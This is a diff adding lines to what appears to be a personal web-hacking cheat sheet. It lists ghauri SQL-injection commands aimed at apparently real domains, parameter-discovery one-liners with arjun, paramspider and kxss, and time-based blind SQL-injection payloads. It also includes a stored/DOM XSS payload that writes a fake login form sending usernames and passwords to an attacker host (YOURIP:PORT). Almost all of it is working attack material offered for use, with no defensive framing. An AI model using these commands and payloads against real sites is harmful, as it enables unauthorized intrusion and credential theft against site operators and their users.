@@ -5,6 +5,20 @@
 ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
 ghauri -r req.txt --batch --flush-session --level 3
 
+paramspider -d example.com
+python3 /home/lipon/Hacking/tools/ex-param/ex-param.py -t https://nitolmotors.com.bd
+arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10  --headers "User-Agent: Mozilla/5.0"
+
+a payload to create a phishing page while you get a xss vulnerability, like stored xss or Dom xss 
+'><script>document.write('<h3>Please login to continue</h3><form action=http://YOURIP:PORT/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
+
+Sql Injection Payload 
+Payload : 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+Blind SQL Injection payload :  if(now()=sysdate()%2Csleep(10)%2C0)
+Tricky ASP blind SQL Injection in a login page. Payload:   ';%20waitfor%20delay%20'0:0:6'%20--%20
+
 >> https://x.com/brutelogic?mx=2
 
 '"()><img src="x"><a href="https://google.com">click</a>
